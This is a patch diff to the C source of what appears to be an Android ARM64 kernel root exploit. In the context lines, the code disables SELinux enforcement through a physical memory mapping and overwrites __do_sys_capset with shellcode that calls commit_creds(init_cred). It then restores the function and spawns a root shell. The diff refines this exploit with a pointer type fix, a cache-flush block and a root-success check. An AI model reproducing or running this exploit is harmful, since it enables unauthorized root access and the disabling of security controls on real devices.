@@ -608,7 +608,6 @@ int main() {
     bool* kernel_selinux_state_enforcing_ptr = kernel_physical_base + (kernel_selinux_state_addr - kernel_virtual_base);
     fprintf(stderr, "%lx: %p\n", (kernel_selinux_state_addr - kernel_virtual_base), kernel_selinux_state_enforcing_ptr);
     *kernel_selinux_state_enforcing_ptr = false;
-    __builtin___clear_cache((char*)kernel_selinux_state_enforcing_ptr, (char*)kernel_selinux_state_enforcing_ptr + 1);
 
     uint64_t init_cred_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "init_cred");
     uint64_t commit_creds_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "commit_creds");
@@ -630,13 +629,13 @@ int main() {
         0xA9BF7BFD, // stp x29, x30, [sp, #-0x10]!
         0xD63F0020, // blr x1
         0xA8C17BFD, // ldp x29, x30, [sp], #0x10
-    
+
         0x2A1F03E0, // mov w0, wzr
         0xD65F03C0, // ret
     };
 
     uint64_t kernel___do_sys_capset_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "__do_sys_capset");
-    bool* kernel___do_sys_capset_ptr = kernel_physical_base + (kernel___do_sys_capset_addr - kernel_virtual_base);
+    char* kernel___do_sys_capset_ptr = kernel_physical_base + (kernel___do_sys_capset_addr - kernel_virtual_base);
 
     /* Saving sys_capset current code */
     uint8_t sys_capset[sizeof(shellcode)];
@@ -645,9 +644,11 @@ int main() {
     memcpy(kernel___do_sys_capset_ptr, shellcode, sizeof(shellcode));
 
     // stupidest cache flush...
-    void* garbage = malloc(0x1000000);
-    memset(garbage, 0x41, 0x1000000);
-    free(garbage);
+    {
+        void* garbage = malloc(0x1000000);
+        memset(garbage, 0x41, 0x1000000);
+        free(garbage);
+    }
 
     /* Calling our patched version of sys_capset */
     #pragma clang diagnostic push
@@ -660,6 +661,10 @@ int main() {
     }
     /* Restoring sys_capset */
     memcpy(kernel___do_sys_capset_ptr, sys_capset, sizeof(sys_capset));
+    if (getuid() != 0) {
+        fprintf(stderr, "failed to get root - rerun?\n");
+        return 1;
+    }
 
     execl("/system/bin/sh", "sh", NULL);
 
